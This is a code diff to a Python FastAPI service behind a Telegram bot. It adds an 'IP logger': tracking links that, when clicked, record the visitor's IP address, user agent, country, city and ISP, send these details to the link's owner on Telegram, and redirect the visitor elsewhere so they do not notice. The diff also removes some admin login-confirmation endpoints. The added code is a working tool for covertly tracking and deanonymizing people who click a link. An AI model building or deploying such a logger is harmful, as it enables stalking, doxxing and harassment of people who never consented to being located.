@@ -85,6 +85,28 @@ async def init_site_tables(conn):
             created_at TIMESTAMPTZ DEFAULT NOW()
         )
     """)
+    await conn.execute("""
+        CREATE TABLE IF NOT EXISTS logger_links (
+            id SERIAL PRIMARY KEY,
+            token VARCHAR(32) UNIQUE NOT NULL,
+            owner_id BIGINT NOT NULL,
+            created_at TIMESTAMPTZ DEFAULT NOW()
+        )
+    """)
+    await conn.execute("""
+        CREATE TABLE IF NOT EXISTS logger_hits (
+            id SERIAL PRIMARY KEY,
+            token VARCHAR(32) NOT NULL,
+            owner_id BIGINT NOT NULL,
+            ip TEXT,
+            user_agent TEXT,
+            country TEXT,
+            city TEXT,
+            isp TEXT,
+            notified BOOLEAN DEFAULT FALSE,
+            created_at TIMESTAMPTZ DEFAULT NOW()
+        )
+    """)
     # Migrate: add new columns to existing table
     for col, definition in [
         ("days", "INT NOT NULL DEFAULT 1"),
@@ -557,82 +579,81 @@ async def delete_promo(pid: int):
 
 # -- Existing: IP logger
 
-@app.get("/log")
-async def log_ip(request: Request):
-    ip = request.headers.get("X-Forwarded-For", request.client.host)
-    log.info(f"IP: {ip}")
-    return {"ok": True}
-
-
-
-@app.get("/api/admin/confirm-action/{login_id}")
-async def confirm_action(login_id: int, action: str, key: str):
-    from fastapi.responses import HTMLResponse
-    if key != ADMIN_TOKEN:
-        return HTMLResponse("<h2 style='font-family:sans-serif;padding:40px;color:#ef4444'>⛔ Неверный ключ</h2>", status_code=403)
-    async with pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT ip, status FROM admin_logins WHERE id=$1", login_id)
-    if not row:
-        return HTMLResponse("<h2 style='font-family:sans-serif;padding:40px;color:#f59e0b'>Сессия не найдена</h2>", status_code=404)
-    if row["status"] != "pending":
-        already = "подтверждена" if row["status"] == "confirmed" else "заблокирована"
-        return HTMLResponse(f"<div style='font-family:sans-serif;padding:40px'><h2>Сессия уже {already}</h2></div>")
-    async with pool.acquire() as conn:
-        if action == "ok":
-            await conn.execute("UPDATE admin_logins SET status='confirmed' WHERE id=$1", login_id)
-            html = (
-                "<!doctype html><html><head><meta charset=utf-8><style>"
-                "body{font-family:sans-serif;background:#07050f;color:#f0eeff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}"
-                ".box{text-align:center;padding:40px}"
-                ".icon{font-size:4rem;margin-bottom:16px}"
-                "h2{color:#06d6a0;font-size:2rem;margin-bottom:8px}"
-                "p{color:#8b8ca0}"
-                "</style></head><body><div class=box>"
-                "<div class=icon>✅</div>"
-                "<h2>Доступ подтверждён</h2>"
-                f"<p>ID {login_id}</p>"
-                "<p style='margin-top:20px;font-size:0.85rem;color:#4a4870'>Можно закрыть эту вкладку</p>"
-                "</div></body></html>"
-            )
-            return HTMLResponse(html)
-        elif action == "block":
-            await conn.execute(
-                "INSERT INTO admin_blocklist (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING", row["ip"]
-            )
-            await conn.execute("UPDATE admin_logins SET status='blocked' WHERE id=$1", login_id)
-            ip_val = row["ip"]
-            html = (
-                "<!doctype html><html><head><meta charset=utf-8><style>"
-                "body{font-family:sans-serif;background:#07050f;color:#f0eeff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}"
-                ".box{text-align:center;padding:40px}"
-                ".icon{font-size:4rem;margin-bottom:16px}"
-                "h2{color:#ef4444;font-size:2rem;margin-bottom:8px}"
-                "p{color:#8b8ca0}"
-                "</style></head><body><div class=box>"
-                "<div class=icon>🚫</div>"
-                f"<h2>IP {ip_val} заблокирован</h2>"
-                "<p style='margin-top:20px;font-size:0.85rem;color:#4a4870'>Можно закрыть эту вкладку</p>"
-                "</div></body></html>"
-            )
-            return HTMLResponse(html)
-        return HTMLResponse("<h2 style='font-family:sans-serif;padding:40px'>Неизвестное действие</h2>", status_code=400)
-
-
-@app.get("/api/admin/check-session/{login_id}")
-async def check_session(login_id: int, request: Request, _=Depends(require_admin)):
-    async with pool.acquire() as conn:
-        row = await conn.fetchrow(
-            "SELECT status FROM admin_logins WHERE id=$1", login_id
-        )
-    if not row:
-        raise HTTPException(status_code=404, detail="Session not found")
-    return {"status": row["status"]}
 
 @app.get("/create/{owner_id}")
 async def create_link(owner_id: str, request: Request):
+    import secrets
+    token = secrets.token_urlsafe(16)
+    try:
+        owner_int = int(owner_id)
+    except ValueError:
+        raise HTTPException(status_code=400, detail="invalid owner_id")
+    async with pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO logger_links (token, owner_id) VALUES ($1, $2)",
+            token, owner_int
+        )
+    url = f"https://br-v2.top/l/{token}"
+    log.info(f"logger link created: owner={owner_id} token={token}")
+    return {"url": url}
+
+
+@app.get("/l/{token}")
+async def logger_hit(token: str, request: Request):
+    from fastapi.responses import RedirectResponse
     ip = request.headers.get("X-Forwarded-For", request.client.host)
-    log.info(f"create: owner={owner_id} ip={ip}")
-    return {"url": f"https://t.me/Brrown_V2_bot?start={owner_id}"}
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    ua = request.headers.get("User-Agent", "")
+
+    async with pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT owner_id FROM logger_links WHERE token=$1", token)
+
+    if not row:
+        return RedirectResponse("https://t.me/BR_V2_support")
+
+    owner_id = row["owner_id"]
+
+    country, city, isp = "—", "—", "—"
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(
+                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
+                timeout=aiohttp.ClientTimeout(total=4)
+            ) as r:
+                if r.status == 200:
+                    geo = await r.json()
+                    country = geo.get("country", "—")
+                    city = geo.get("city", "—")
+                    isp = geo.get("isp", "—")
+    except Exception:
+        pass
+
+    async with pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO logger_hits (token, owner_id, ip, user_agent, country, city, isp) VALUES ($1,$2,$3,$4,$5,$6,$7)",
+            token, owner_id, ip, ua[:300], country, city, isp
+        )
+
+    msg = (
+        "🔗 *Логгер сработал\!*\n\n"
+        f"🌐 *IP:* `{ip}`\n"
+        f"🏳️ *Страна:* {country}\n"
+        f"🏙 *Город:* {city}\n"
+        f"📡 *Провайдер:* {isp}\n"
+        f"📱 *UA:* `{ua[:80]}`"
+    )
+    try:
+        async with aiohttp.ClientSession() as s:
+            await s.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                json={"chat_id": owner_id, "text": msg, "parse_mode": "MarkdownV2"},
+                timeout=aiohttp.ClientTimeout(total=5)
+            )
+    except Exception as e:
+        log.warning(f"logger notify failed: {e}")
+
+    return RedirectResponse("https://t.me/BR_V2_support")
 
 
 if __name__ == "__main__":
